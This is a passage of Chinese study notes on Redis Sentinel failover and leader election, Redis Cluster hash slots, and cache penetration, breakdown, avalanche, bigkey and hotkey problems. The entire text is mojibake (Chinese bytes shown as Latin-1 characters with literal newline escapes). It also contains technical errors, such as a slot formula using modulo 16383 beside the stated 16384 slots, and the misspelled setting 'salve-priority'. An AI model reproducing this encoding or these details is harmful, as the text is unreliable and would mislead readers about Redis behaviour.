¸å¿ƒåŠŸèƒ½æ˜¯ä¸»èŠ‚ç‚¹çš„è‡ªåŠ¨æ•…éšœè½¬ç§»ã€‚\n\nå› ä¸ºRedis Sentinelå®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªè¿è¡Œåœ¨ç‰¹æ®Šæ¨¡å¼ä¸‹çš„RedisæœåŠ¡å™¨ï¼Œæ‰€ä»¥ç”¨æˆ·ä¹Ÿå¯ä»¥ä½¿ç”¨å‘½ä»¤redis-server sentinel.conf --sentinelå»å¯åŠ¨ä¸€ä¸ªSentinelï¼šè¿™é‡Œçš„--sentinelå‚æ•°ç”¨äºæŒ‡ç¤ºRedisæœåŠ¡å™¨è¿›å…¥Sentinelæ¨¡å¼ï¼Œä»è€Œå˜æˆä¸€ä¸ªRedis Sentinelè€Œä¸æ˜¯æ™®é€šçš„RedisæœåŠ¡å™¨ã€‚\n\n### 2.1 å“¨å…µçš„åŠŸèƒ½\n\n+ ç›‘æ§ï¼ˆMonitoringï¼‰\n\n  å“¨å…µä¼šä¸æ–­åœ°æ£€æŸ¥ä¸»èŠ‚ç‚¹å’Œä»èŠ‚ç‚¹æ˜¯å¦è¿ä½œæ­£å¸¸ã€‚\n\n+ è‡ªåŠ¨æ•…éšœè½¬ç§»ï¼ˆAutomatic failoverï¼‰\n\n  å½“ä¸»èŠ‚ç‚¹ä¸èƒ½æ­£å¸¸å·¥ä½œæ—¶ï¼Œå“¨å…µä¼šå¼€å§‹è‡ªåŠ¨æ•…éšœè½¬ç§»æ“ä½œï¼Œå®ƒä¼šå°†å¤±æ•ˆä¸»èŠ‚ç‚¹çš„å…¶ä¸­ä¸€ä¸ªä»èŠ‚ç‚¹å‡çº§ä¸ºæ–°çš„ä¸»èŠ‚ç‚¹ï¼Œå¹¶è®©å…¶ä»–ä»èŠ‚ç‚¹æ”¹ä¸ºå¤åˆ¶æ–°çš„ä¸»èŠ‚ç‚¹ã€‚\n\n\n+ é…ç½®æä¾›è€…ï¼ˆConfiguration providerï¼‰\n\n  å®¢æˆ·ç«¯åœ¨åˆå§‹åŒ–æ—¶ï¼Œé€šè¿‡è¿æ¥å“¨å…µæ¥è·å¾—å½“å‰RedisæœåŠ¡çš„ä¸»èŠ‚ç‚¹åœ°å€ã€‚\n\n+ é€šçŸ¥ï¼ˆNotificationï¼‰\n\n  å“¨å…µå¯ä»¥å°†æ•…éšœè½¬ç§»çš„ç»“æœå‘é€ç»™å®¢æˆ·ç«¯ã€‚\n\n\n\nå…¶ä¸­ï¼Œç›‘æ§å’Œè‡ªåŠ¨æ•…éšœè½¬ç§»åŠŸèƒ½ï¼Œä½¿å¾—å“¨å…µå¯ä»¥åŠæ—¶å‘ç°ä¸»èŠ‚ç‚¹æ•…éšœå¹¶å®Œæˆè½¬ç§»ï¼›è€Œé…ç½®æä¾›è€…å’Œé€šçŸ¥åŠŸèƒ½ï¼Œåˆ™éœ€è¦åœ¨ä¸å®¢æˆ·ç«¯çš„äº¤äº’ä¸­æ‰èƒ½ä½“ç°ã€‚\n\n### 2.2 å“¨å…µé›†ç¾¤çš„ç»„å»º\n\nå“¨å…µå®ä¾‹ä¹‹é—´å¯ä»¥ç›¸äº’å‘ç°ï¼Œè¦å½’åŠŸäº Redis æä¾›çš„ pub/sub æœºåˆ¶ï¼Œä¹Ÿå°±æ˜¯å‘å¸ƒ / è®¢é˜…æœºåˆ¶ã€‚\n\nåœ¨ä¸»ä»é›†ç¾¤ä¸­ï¼Œä¸»åº“ä¸Šæœ‰ä¸€ä¸ªåä¸º`__sentinel__:hello`çš„é¢‘é“ï¼Œä¸åŒå“¨å…µå°±æ˜¯é€šè¿‡å®ƒæ¥ç›¸äº’å‘ç°ï¼Œå®ç°äº’ç›¸é€šä¿¡çš„ã€‚åœ¨ä¸‹å›¾ä¸­ï¼Œå“¨å…µ 1 æŠŠè‡ªå·±çš„ IPï¼ˆ172.16.19.3ï¼‰å’Œç«¯å£ï¼ˆ26579ï¼‰å‘å¸ƒåˆ°`__sentinel__:hello`é¢‘é“ä¸Šï¼Œå“¨å…µ 2 å’Œ 3 è®¢é˜…äº†è¯¥é¢‘é“ã€‚é‚£ä¹ˆæ­¤æ—¶ï¼Œå“¨å…µ 2 å’Œ 3 å°±å¯ä»¥ä»è¿™ä¸ªé¢‘é“ç›´æ¥è·å–å“¨å…µ 1 çš„ IP åœ°å€å’Œç«¯å£å·ã€‚ç„¶åï¼Œå“¨å…µ 2ã€3 å¯ä»¥å’Œå“¨å…µ 1 å»ºç«‹ç½‘ç»œè¿æ¥ã€‚\n\n<img src=\"redisä¸»ä»å¤åˆ¶å’Œå“¨å…µé›†ç¾¤/image-20230831124346791.png\" alt=\"image-20230831124346791\" style=\"zoom:50%;\" />\n\n```bash\n# sentinel monitor <master-name> <master-host> <master-port> <quorum>\n# ä¸¾ä¾‹å¦‚ä¸‹ï¼š\nsentinel monitor mymaster 127.0.0.1 6379 2\n```\n\n\n\n### 2.3 å“¨å…µç›‘æ§Redisåº“\n\nè¿™æ˜¯ç”±å“¨å…µå‘ä¸»åº“å‘é€ INFO å‘½ä»¤æ¥å®Œæˆçš„ã€‚å°±åƒä¸‹å›¾æ‰€ç¤ºï¼Œå“¨å…µ 2 ç»™ä¸»åº“å‘é€ INFO å‘½ä»¤ï¼Œä¸»åº“æ¥å—åˆ°è¿™ä¸ªå‘½ä»¤åï¼Œå°±ä¼šæŠŠä»åº“åˆ—è¡¨è¿”å›ç»™å“¨å…µã€‚æ¥ç€ï¼Œå“¨å…µå°±å¯ä»¥æ ¹æ®ä»åº“åˆ—è¡¨ä¸­çš„è¿æ¥ä¿¡æ¯ï¼Œå’Œæ¯ä¸ªä»åº“å»ºç«‹è¿æ¥ï¼Œå¹¶åœ¨è¿™ä¸ªè¿æ¥ä¸ŠæŒç»­åœ°å¯¹ä»åº“è¿›è¡Œç›‘æ§ã€‚å“¨å…µ 1 å’Œ 3 å¯ä»¥é€šè¿‡ç›¸åŒçš„æ–¹æ³•å’Œä»åº“å»ºç«‹è¿æ¥ã€‚\n\n<img src=\"redisä¸»ä»å¤åˆ¶å’Œå“¨å…µé›†ç¾¤/image-20230831124508686.png\" alt=\"image-20230831124508686\" style=\"zoom:50%;\" />\n\n### 2.4 ä¸»åº“ä¸‹çº¿çš„åˆ¤å®š\n\né¦–å…ˆè¦ç†è§£ä¸¤ä¸ªæ¦‚å¿µï¼šä¸»è§‚ä¸‹çº¿å’Œå®¢è§‚ä¸‹çº¿ã€‚\n\n- ä¸»è§‚ä¸‹çº¿\n\n  ä»»ä½•ä¸€ä¸ªå“¨å…µéƒ½æ˜¯å¯ä»¥ç›‘æ§æ¢æµ‹ï¼Œå¹¶ä½œå‡ºRedisèŠ‚ç‚¹ä¸‹çº¿çš„åˆ¤æ–­ã€‚\n\n- å®¢è§‚ä¸‹çº¿\n\n  æœ‰å“¨å…µé›†ç¾¤å…±åŒå†³å®šRedisèŠ‚ç‚¹æ˜¯å¦ä¸‹çº¿ã€‚\n\nå½“æŸä¸ªå“¨å…µï¼ˆå¦‚ä¸‹å›¾ä¸­çš„å“¨å…µ2ï¼‰åˆ¤æ–­ä¸»åº“â€œä¸»è§‚ä¸‹çº¿â€åï¼Œå°±ä¼šç»™å…¶ä»–å“¨å…µå‘é€ `is-master-down-by-addr` å‘½ä»¤ã€‚æ¥ç€ï¼Œå…¶ä»–å“¨å…µä¼šæ ¹æ®è‡ªå·±å’Œä¸»åº“çš„è¿æ¥æƒ…å†µï¼Œåšå‡º Y æˆ– N çš„å“åº”ï¼ŒY ç›¸å½“äºèµæˆç¥¨ï¼ŒN ç›¸å½“äºåå¯¹ç¥¨ã€‚\n\n<img src=\"redisä¸»ä»å¤åˆ¶å’Œå“¨å…µé›†ç¾¤/image-20230831124617329.png\" alt=\"image-20230831124617329\" style=\"zoom:50%;\" />\n\nå¦‚æœèµæˆç¥¨æ•°ï¼ˆè¿™é‡Œæ˜¯2ï¼‰æ˜¯å¤§äºç­‰äºå“¨å…µé…ç½®æ–‡ä»¶ä¸­çš„ `quorum` é…ç½®é¡¹ï¼ˆæ¯”å¦‚è¿™é‡Œå¦‚æœæ˜¯quorum=2ï¼‰, åˆ™å¯ä»¥åˆ¤å®šä¸»åº“å®¢è§‚ä¸‹çº¿äº†ã€‚\n\n### 2.5 å“¨å…µ Leader çš„é€‰ä¸¾\n\nä¸ºäº†é¿å…å“¨å…µçš„å•ç‚¹æƒ…å†µå‘ç”Ÿï¼Œæ‰€ä»¥éœ€è¦ä¸€ä¸ªå“¨å…µçš„åˆ†å¸ƒå¼é›†ç¾¤ã€‚å“¨å…µçš„é€‰ä¸¾æœºåˆ¶å…¶å®å¾ˆç®€å•ï¼Œå°±æ˜¯ä¸€ä¸ªRafté€‰ä¸¾ç®—æ³•ï¼š é€‰ä¸¾çš„ç¥¨æ•°å¤§äºç­‰äºnum(sentinels)/2+1æ—¶ï¼Œå°†æˆä¸ºé¢†å¯¼è€…ï¼Œå¦‚æœæ²¡æœ‰è¶…è¿‡ï¼Œç»§ç»­é€‰ä¸¾ã€‚\n\nä»»ä½•ä¸€ä¸ªæƒ³æˆä¸º Leader çš„å“¨å…µï¼Œè¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ã€‚ç¬¬ä¸€ï¼Œæ‹¿åˆ°åŠæ•°ä»¥ä¸Šçš„èµæˆç¥¨ï¼›ç¬¬äºŒï¼Œæ‹¿åˆ°çš„ç¥¨æ•°åŒæ—¶è¿˜éœ€è¦å¤§äºç­‰äºå“¨å…µé…ç½®æ–‡ä»¶ä¸­çš„ quorum å€¼ã€‚\n\nä»¥ 3 ä¸ªå“¨å…µä¸ºä¾‹ï¼Œå‡è®¾æ­¤æ—¶çš„ quorum è®¾ç½®ä¸º 2ï¼Œé‚£ä¹ˆï¼Œä»»ä½•ä¸€ä¸ªæƒ³æˆä¸º Leader çš„å“¨å…µåªè¦æ‹¿åˆ° 2 å¼ èµæˆç¥¨ï¼Œå°±å¯ä»¥äº†ã€‚\n\n### 2.6 å“¨å…µLeader æ•…éšœè½¬ç§»\n\nä¸»ä»æ•…éšœè½¬ç§»æ“ä½œåŒ…å«ä»¥ä¸‹å››ä¸ªæ­¥éª¤ï¼š\n\n- ç¬¬ä¸€æ­¥ï¼šåœ¨å·²ä¸‹çº¿ä¸»èŠ‚ç‚¹ï¼ˆæ—§ä¸»èŠ‚ç‚¹ï¼‰å±ä¸‹çš„æ‰€æœ‰ã€Œä»èŠ‚ç‚¹ã€é‡Œé¢ï¼ŒæŒ‘é€‰å‡ºä¸€ä¸ªä»èŠ‚ç‚¹ï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºä¸»èŠ‚ç‚¹ã€‚\n- ç¬¬äºŒæ­¥ï¼šè®©å·²ä¸‹çº¿ä¸»èŠ‚ç‚¹å±ä¸‹çš„æ‰€æœ‰ã€Œä»èŠ‚ç‚¹ã€ä¿®æ”¹å¤åˆ¶ç›®æ ‡ï¼Œä¿®æ”¹ä¸ºå¤åˆ¶ã€Œæ–°ä¸»èŠ‚ç‚¹ã€ï¼›\n- ç¬¬ä¸‰æ­¥ï¼šå°†æ–°ä¸»èŠ‚ç‚¹çš„ IP åœ°å€å’Œä¿¡æ¯ï¼Œé€šè¿‡ã€Œå‘å¸ƒè€…/è®¢é˜…è€…æœºåˆ¶ã€é€šçŸ¥ç»™å®¢æˆ·ç«¯ï¼›\n- ç¬¬å››æ­¥ï¼šç»§ç»­ç›‘è§†æ—§ä¸»èŠ‚ç‚¹ï¼Œå½“è¿™ä¸ªæ—§ä¸»èŠ‚ç‚¹é‡æ–°ä¸Šçº¿æ—¶ï¼Œå°†å®ƒè®¾ç½®ä¸ºæ–°ä¸»èŠ‚ç‚¹çš„ä»èŠ‚ç‚¹ï¼›\n\n##### æ–°ä¸»åº“çš„é€‰å‡º\n\n- è¿‡æ»¤æ‰ä¸å¥åº·çš„ï¼ˆä¸‹çº¿æˆ–æ–­çº¿ï¼‰ï¼Œæ²¡æœ‰å›å¤è¿‡å“¨å…µpingå“åº”çš„ä»èŠ‚ç‚¹\n- é€‰æ‹©`salve-priority`ä»èŠ‚ç‚¹ä¼˜å…ˆçº§æœ€é«˜ï¼ˆredis.confï¼‰çš„\n- é€‰æ‹©å¤åˆ¶åç§»é‡æœ€å¤§ï¼Œåªå¤åˆ¶æœ€å®Œæ•´çš„ä»èŠ‚ç‚¹\n\n<img src=\"redisä¸»ä»å¤åˆ¶å’Œå“¨å…µé›†ç¾¤/image-20230831125253170.png\" alt=\"image-20230831125253170\" style=\"zoom:50%;\" />\n\n\n\n##### åˆ¤å®šä¸»åº“å®¢è§‚ä¸‹çº¿ å’Œ  æ˜¯å¦èƒ½å¤Ÿä¸»ä»åˆ‡æ¢ï¼Ÿ\n\nRedis 1ä¸»4ä»ï¼Œ5ä¸ªå“¨å…µï¼Œå“¨å…µé…ç½®quorumä¸º2ï¼Œå¦‚æœ3ä¸ªå“¨å…µæ•…éšœï¼Œå½“ä¸»åº“å®•æœºæ—¶ï¼Œå“¨å…µèƒ½å¦åˆ¤æ–­ä¸»åº“â€œå®¢è§‚ä¸‹çº¿â€ï¼Ÿèƒ½å¦è‡ªåŠ¨åˆ‡æ¢ï¼Ÿ\n\n1ã€å“¨å…µé›†ç¾¤å¯ä»¥åˆ¤å®šä¸»åº“â€œä¸»è§‚ä¸‹çº¿â€ã€‚ç”±äºquorum=2ï¼Œæ‰€ä»¥å½“ä¸€ä¸ªå“¨å…µåˆ¤æ–­ä¸»åº“â€œä¸»è§‚ä¸‹çº¿â€åï¼Œè¯¢é—®å¦å¤–ä¸€ä¸ªå“¨å…µåä¹Ÿä¼šå¾—åˆ°åŒæ ·çš„ç»“æœï¼Œ2ä¸ªå“¨å…µéƒ½åˆ¤å®šâ€œä¸»è§‚ä¸‹çº¿â€ï¼Œè¾¾åˆ°äº†quorumçš„å€¼ï¼Œå› æ­¤ï¼Œå“¨å…µé›†ç¾¤å¯ä»¥åˆ¤å®šä¸»åº“ä¸ºâ€œå®¢è§‚ä¸‹çº¿â€ã€‚\n\n2ã€ä½†å“¨å…µä¸èƒ½å®Œæˆä¸»ä»åˆ‡æ¢ã€‚å“¨å…µæ ‡è®°ä¸»åº“â€œå®¢è§‚ä¸‹çº¿åâ€ï¼Œåœ¨é€‰ä¸¾â€œå“¨å…µé¢†å¯¼è€…â€æ—¶ï¼Œä¸€ä¸ªå“¨å…µå¿…é¡»æ‹¿åˆ°è¶…è¿‡å¤šæ•°çš„é€‰ç¥¨(5/2+1=3ç¥¨)ã€‚ä½†ç›®å‰åªæœ‰2ä¸ªå“¨å…µæ´»ç€ï¼Œæ— è®ºæ€ä¹ˆæŠ•ç¥¨ï¼Œä¸€ä¸ªå“¨å…µæœ€å¤šåªèƒ½æ‹¿åˆ°2ç¥¨ï¼Œæ°¸è¿œæ— æ³•è¾¾åˆ°`N/2+1`é€‰ç¥¨çš„ç»“æœã€‚\n\n\n\n# 3. Redis Cluster\n\nRedis-clusteræ˜¯ä¸€ç§æœåŠ¡å™¨ShardingæŠ€æœ¯ï¼ŒRedis3.0ä»¥åç‰ˆæœ¬æ­£å¼æä¾›æ”¯æŒã€‚Redis Cluster åŠŸèƒ½ ï¼š è´Ÿè½½å‡è¡¡ï¼Œæ•…éšœåˆ‡æ¢**ï¼Œ**ä¸»ä»å¤åˆ¶ã€‚\n\n**Redis Clusterè¦æ±‚è‡³å°‘éœ€è¦3ä¸ªmasteræ‰èƒ½ç»„æˆä¸€ä¸ªé›†ç¾¤ï¼ŒåŒæ—¶æ¯ä¸ªmasterè‡³å°‘éœ€è¦æœ‰ä¸€ä¸ªslaveèŠ‚ç‚¹ã€‚**å„ä¸ªèŠ‚ç‚¹ä¹‹é—´ä¿æŒTCPé€šä¿¡ã€‚å½“masterå‘ç”Ÿäº†å®•æœºï¼Œ Redis Clusterè‡ªåŠ¨ä¼šå°†å¯¹åº”çš„slaveèŠ‚ç‚¹ææ‹”ä¸ºmasterï¼Œæ¥é‡æ–°å¯¹å¤–æä¾›æœåŠ¡ã€‚\n\n<img src=\"redisä¸»ä»å¤åˆ¶å’Œå“¨å…µé›†ç¾¤/68747470733a2f2f6f7363696d672e6f736368696e612e6e65742f6f73636e65742f30393166626664326437306266346531613932663861306235313039353937666565652e6a7067.png\" alt=\"img\" style=\"zoom:77%;\" />\n\n### 3.1 ç‰¹ç‚¹\n\n- å¤šä¸»å¤šä»ï¼Œå»ä¸­å¿ƒåŒ–\n\n  ä»èŠ‚ç‚¹ä½œä¸ºå¤‡ç”¨ï¼Œå¤åˆ¶ä¸»èŠ‚ç‚¹ï¼Œä¸åšè¯»å†™æ“ä½œï¼Œä¸æä¾›æœåŠ¡ã€‚\n\n- ä¸æ”¯æŒå¤„ç†å¤šä¸ªkey\n\n  å› ä¸ºæ•°æ®åˆ†æ•£åœ¨å¤šä¸ªèŠ‚ç‚¹ï¼Œåœ¨æ•°æ®é‡å¤§é«˜å¹¶å‘çš„æƒ…å†µä¸‹ä¼šå½±å“æ€§èƒ½ï¼›\n\n- æ”¯æŒåŠ¨æ€æ‰©å®¹èŠ‚ç‚¹\n\n  è¿™æ˜¯æˆ‘è®¤ä¸ºç®—æ˜¯Rerdis Clusteræœ€å¤§çš„ä¼˜ç‚¹ä¹‹ä¸€\n\n- èŠ‚ç‚¹ä¹‹é—´ç›¸äº’é€šä¿¡ï¼Œç›¸äº’é€‰ä¸¾ï¼Œä¸å†ä¾èµ–sentinel\n\n  å‡†ç¡®æ¥è¯´æ˜¯ä¸»èŠ‚ç‚¹ä¹‹é—´ç›¸äº’â€œç›‘ç£â€ï¼Œä¿è¯åŠæ—¶æ•…éšœè½¬ç§»ã€‚\n\n### 3.2 å“ˆå¸Œæ§½åˆ†åŒº\n\nRedis-clusteræ²¡æœ‰ä½¿ç”¨ä¸€è‡´æ€§hashï¼Œè€Œæ˜¯å¼•å…¥äº†å“ˆå¸Œæ§½çš„æ¦‚å¿µã€‚Redis-clusterä¸­æœ‰16384(å³2çš„14æ¬¡æ–¹ï¼‰ä¸ªå“ˆå¸Œæ§½ï¼Œæ¯ä¸ªkeyé€šè¿‡CRC16æ ¡éªŒåå¯¹16383å–æ¨¡æ¥å†³å®šæ”¾ç½®å“ªä¸ªæ§½ã€‚Clusterä¸­çš„æ¯ä¸ªèŠ‚ç‚¹è´Ÿè´£ä¸€éƒ¨åˆ†hashæ§½ï¼ˆhash slotï¼‰ã€‚\n\næ¯”å¦‚æˆ‘ä»¬ç°åœ¨æœ‰5ä¸ªèŠ‚ç‚¹ï¼Œæ¯ä¸ªèŠ‚ç‚¹å¹³å‡å¤§çº¦è´Ÿè´£3276ä¸ªæ§½ã€‚Redis Cluster è®¡ç®—å…¬å¼ï¼šslot=CRC16ï¼ˆkeyï¼‰% 16383ã€‚æ¯ä¸€ä¸ªèŠ‚ç‚¹è´Ÿè´£ç»´æŠ¤ä¸€éƒ¨åˆ†æ§½ä»¥åŠæ§½æ‰€æ˜ å°„çš„é”®å€¼æ•°æ®ã€‚\n\n<img src=\"redisä¸»ä»å¤åˆ¶å’Œå“¨å…µé›†ç¾¤/1460000038771815.jpeg\" alt=\"img\" style=\"zoom:70%;\" />\n\n\n\n# 4. ç¼“å­˜é—®é¢˜\n### 4.1 ç¼“å­˜ç©¿é€(æ”»å‡»ï¼Œç”¨å¸ƒéš†è¿‡æ»¤å™¨)\n\nç¼“å­˜ç©¿é€æ˜¯æŒ‡ç¼“å­˜å’Œæ•°æ®åº“ä¸­éƒ½æ²¡æœ‰çš„æ•°æ®ï¼Œè€Œç”¨æˆ·ä¸æ–­å‘èµ·è¯·æ±‚ã€‚ç”±äºç¼“å­˜ä¸å‘½ä¸­ï¼Œå¹¶ä¸”å‡ºäºå®¹é”™è€ƒè™‘ï¼Œå¦‚æœä»æ•°æ®åº“æŸ¥ä¸åˆ°æ•°æ®åˆ™ä¸å†™å…¥ç¼“å­˜ï¼Œè¿™å°†å¯¼è‡´è¿™ä¸ªä¸å­˜åœ¨çš„æ•°æ®æ¯æ¬¡è¯·æ±‚éƒ½è¦åˆ°æ•°æ®åº“å»æŸ¥è¯¢ï¼Œå¤±å»äº†ç¼“å­˜çš„æ„ä¹‰ã€‚\n\nå¦‚å‘èµ·ä¸ºidä¸ºâ€œ-1â€çš„æ•°æ®æˆ–idä¸ºç‰¹åˆ«å¤§ä¸å­˜åœ¨çš„æ•°æ®ã€‚è¿™æ—¶çš„ç”¨æˆ·å¾ˆå¯èƒ½æ˜¯æ”»å‡»è€…ï¼Œæ”»å‡»ä¼šå¯¼è‡´æ•°æ®åº“å‹åŠ›è¿‡å¤§ã€‚\n\n**è§£æ”¾æ–¹æ¡ˆ**\n\n+ æ¥å£å±‚å¢åŠ æ ¡éªŒï¼Œå¦‚ç”¨æˆ·é‰´æƒæ ¡éªŒï¼ŒidåšåŸºç¡€æ ¡éªŒï¼Œid<=0çš„ç›´æ¥æ‹¦æˆªï¼›\n\n+ ä»ç¼“å­˜å–ä¸åˆ°çš„æ•°æ®ï¼Œåœ¨æ•°æ®åº“ä¸­ä¹Ÿæ²¡æœ‰å–åˆ°ï¼Œè¿™æ—¶ä¹Ÿå¯ä»¥å°†key-valueå¯¹å†™ä¸ºkey-nullï¼Œç¼“å­˜æœ‰æ•ˆæ—¶é—´å¯ä»¥è®¾ç½®çŸ­ç‚¹ï¼Œå¦‚30ç§’ï¼ˆè®¾ç½®å¤ªé•¿ä¼šå¯¼è‡´æ­£å¸¸æƒ…å†µä¹Ÿæ²¡æ³•ä½¿ç”¨ï¼‰ã€‚è¿™æ ·å¯ä»¥é˜²æ­¢æ”»å‡»ç”¨æˆ·åå¤ç”¨åŒä¸€ä¸ªidæš´åŠ›æ”»å‡»\n\n+ å¸ƒéš†è¿‡æ»¤å™¨ã€‚bloomfilterå°±ç±»ä¼¼äºä¸€ä¸ªhash setï¼Œç”¨äºå¿«é€Ÿåˆ¤æŸä¸ªå…ƒç´ æ˜¯å¦å­˜åœ¨äºé›†åˆä¸­ï¼Œå…¶å…¸å‹çš„åº”ç”¨åœºæ™¯å°±æ˜¯å¿«é€Ÿåˆ¤æ–­ä¸€ä¸ªkeyæ˜¯å¦å­˜åœ¨äºæŸå®¹å™¨ï¼Œä¸å­˜åœ¨å°±ç›´æ¥è¿”å›ã€‚å¸ƒéš†è¿‡æ»¤å™¨çš„å…³é”®å°±åœ¨äºhashç®—æ³•å’Œå®¹å™¨å¤§å°ã€‚\n\n   å¸ƒéš†åˆ¤æ–­æœ‰å¯èƒ½æ˜¯é”™çš„(åˆ«äººçš„ hash ç¢°æ’)ã€‚ä¸è¿‡å‘Šè¯‰æˆ‘ä¸å­˜åœ¨ï¼Œå°±ä¸€å®šä¸å­˜åœ¨ã€‚ å…ˆå»å¸ƒéš†è¿‡æ»¤å™¨æŸ¥è¯¢ï¼Œå†å» redisã€‚\n\n### 4.2 ç¼“å­˜å‡»ç©¿\n\nç¼“å­˜å‡»ç©¿æ˜¯æŒ‡ç¼“å­˜ä¸­æ²¡æœ‰ä½†æ•°æ®åº“ä¸­æœ‰çš„æ•°æ®ï¼ˆä¸€èˆ¬æ˜¯ç¼“å­˜æ—¶é—´åˆ°æœŸï¼‰ï¼Œè¿™æ—¶ç”±äºå¹¶å‘ç”¨æˆ·ç‰¹åˆ«å¤šï¼ŒåŒæ—¶è¯»ç¼“å­˜æ²¡è¯»åˆ°æ•°æ®ï¼ŒåˆåŒæ—¶å»æ•°æ®åº“å»å–æ•°æ®ï¼Œå¼•èµ·æ•°æ®åº“å‹åŠ›ç¬é—´å¢å¤§ï¼Œé€ æˆè¿‡å¤§å‹åŠ›ã€‚\n\n**è§£å†³æ–¹æ¡ˆ**\n\n+ è®¾ç½®çƒ­ç‚¹æ•°æ®æ°¸è¿œä¸è¿‡æœŸã€‚\n\n+ æ¥å£é™æµä¸ç†”æ–­ï¼Œé™çº§ã€‚é‡è¦çš„æ¥å£ä¸€å®šè¦åšå¥½é™æµç­–ç•¥ï¼Œé˜²æ­¢ç”¨æˆ·æ¶æ„åˆ·æ¥å£ï¼ŒåŒæ—¶è¦é™çº§å‡†å¤‡ï¼Œå½“æ¥å£ä¸­çš„æŸäº› æœåŠ¡ ä¸å¯ç”¨æ—¶å€™ï¼Œè¿›è¡Œç†”æ–­ï¼Œå¤±è´¥å¿«é€Ÿè¿”å›æœºåˆ¶ã€‚\n\n+ åŠ äº’æ–¥é”\n\n### 4.3 ç¼“å­˜é›ªå´©\n\nç¼“å­˜é›ªå´©æ˜¯æŒ‡ç¼“å­˜ä¸­æ•°æ®å¤§æ‰¹é‡åˆ°è¿‡æœŸæ—¶é—´ï¼Œè€ŒæŸ¥è¯¢æ•°æ®é‡å·¨å¤§ï¼Œå¼•èµ·æ•°æ®åº“å‹åŠ›è¿‡å¤§ç”šè‡³downæœºã€‚å’Œç¼“å­˜å‡»ç©¿ä¸åŒçš„æ˜¯ï¼Œç¼“å­˜å‡»ç©¿æŒ‡å¹¶å‘æŸ¥åŒä¸€æ¡æ•°æ®ï¼Œç¼“å­˜é›ªå´©æ˜¯ä¸åŒæ•°æ®éƒ½è¿‡æœŸäº†ï¼Œå¾ˆå¤šæ•°æ®éƒ½æŸ¥ä¸åˆ°ä»è€ŒæŸ¥æ•°æ®åº“ã€‚\n\nä½†æ˜¯ä¹Ÿæœ‰Redis æŒ‚æ‰äº†ï¼Œè¯·æ±‚å…¨éƒ¨èµ°æ•°æ®åº“ã€‚å¯¹ç¼“å­˜æ•°æ®è®¾ç½®ç›¸åŒçš„è¿‡æœŸæ—¶é—´ï¼Œå¯¼è‡´æŸæ®µæ—¶é—´å†…ç¼“å­˜å¤±æ•ˆï¼Œè¯·æ±‚å…¨éƒ¨èµ°æ•°æ®åº“ã€‚\n\n**è§£å†³æ–¹æ¡ˆ**\n\n+ ç¼“å­˜æ•°æ®çš„è¿‡æœŸæ—¶é—´è®¾ç½®éšæœºï¼Œé˜²æ­¢åŒä¸€æ—¶é—´å¤§é‡æ•°æ®è¿‡æœŸç°è±¡å‘ç”Ÿã€‚\n\n+ å®ç° Redis çš„é«˜å¯ç”¨ (ä¸»ä»æ¶æ„ + Sentinel æˆ–è€… Redis Cluster)ï¼Œå°½é‡é¿å… Redis æŒ‚æ‰è¿™ç§æƒ…å†µå‘ç”Ÿã€‚\n\n+ ä¸‡ä¸€ Redis çœŸçš„æŒ‚äº†ï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½®æœ¬åœ°ç¼“å­˜ + é™æµï¼Œå°½é‡é¿å…æˆ‘ä»¬çš„æ•°æ®åº“è¢«å¹²æ‰ (èµ·ç èƒ½ä¿è¯æˆ‘ä»¬çš„æœåŠ¡è¿˜æ˜¯èƒ½æ­£å¸¸å·¥ä½œçš„)\n\n### 4.4 bigkey\n\n1. String ç±»å‹çš„ key å¯¹åº”çš„valueè¶…è¿‡ 10 MBã€‚\n2. listã€setã€hashã€zsetç­‰é›†åˆç±»å‹ï¼Œé›†åˆå…ƒç´ ä¸ªæ•°è¶…è¿‡ 5000ä¸ªã€‚\n\n**è§£å†³æ–¹æ¡ˆ**\n\n+ å°†Big Keyæ‹†åˆ†æˆå¤šä¸ªå°çš„keyã€‚è¿™ä¸ªæ–¹æ³•æ¯”è¾ƒç®€å•ï¼Œä½†æ˜¯éœ€è¦ä¿®æ”¹åº”ç”¨ç¨‹åºçš„ä»£ç ã€‚å°±åƒæ˜¯æŠŠä¸€ä¸ªå¤§è›‹ç³•åˆ‡æˆå°è›‹ç³•ä¸€æ ·ï¼Œæœ‰ç‚¹è´¹åŠ›ï¼Œä½†æ˜¯å¯ä»¥è§£å†³é—®é¢˜ã€‚\n+ å¯¹Redisä¸­çš„å¤§Keyè¿›è¡Œæ¸…ç†ï¼Œä»Redisä¸­åˆ é™¤æ­¤ç±»æ•°æ®ã€‚Redisè‡ª4.0èµ·æä¾›äº†UNLINKå‘½ä»¤ï¼Œè¯¥å‘½ä»¤èƒ½å¤Ÿä»¥éé˜»å¡çš„æ–¹å¼ç¼“æ…¢é€æ­¥çš„æ¸…ç†ä¼ å…¥çš„Keyï¼Œé€šè¿‡UNLINKï¼Œä½ å¯ä»¥å®‰å…¨çš„åˆ é™¤å¤§Keyç”šè‡³ç‰¹å¤§Keyã€‚\n\n### 4.5 hotkey\n\n1. çƒ­ç‚¹æ•°æ®ï¼šæŸäº›æ•°æ®å…·æœ‰è¾ƒé«˜çš„è®¿é—®é¢‘ç‡ï¼Œä¾‹å¦‚çƒ­é—¨å•†å“ã€çƒ­é—¨æ–°é—»ã€çƒ­é—¨è¯„è®ºç­‰ã€‚\n2. ä¸šåŠ¡é«˜å³°æœŸï¼šå½“å¤„äºä¸šåŠ¡é«˜å³°æœŸçš„æ—¶å€™ï¼ŒæŸäº›æ•°æ®ä¼šè¢«é¢‘ç¹è®¿é—®ï¼Œä¾‹å¦‚åŒ11ç§’æ€ã€æ•´ç‚¹ç§’æ€ç­‰ã€‚\n\n**è§£å†³æ–¹æ¡ˆ**\n\n+ æ•°æ®åˆ†ç‰‡æ˜¯é€šè¿‡å°†çƒ­ç‚¹æ•°æ®åˆ†æ•£å­˜å‚¨åœ¨å¤šä¸ªRedisèŠ‚ç‚¹ä¸Šï¼Œé¿å…å•ä¸ªèŠ‚ç‚¹è´Ÿè½½è¿‡é«˜ï¼Œæ˜¯è§£å†³çƒ­ç‚¹Keyé—®é¢˜æœ€å¸¸ç”¨çš„ç­–ç•¥ã€‚\n+ ç¼“å­˜é¢„çƒ­æ˜¯æŒ‡åœ¨ç³»ç»Ÿå¯åŠ¨æˆ–é‡å¯åï¼Œä¸»åŠ¨å°†çƒ­ç‚¹æ•°æ®åŠ 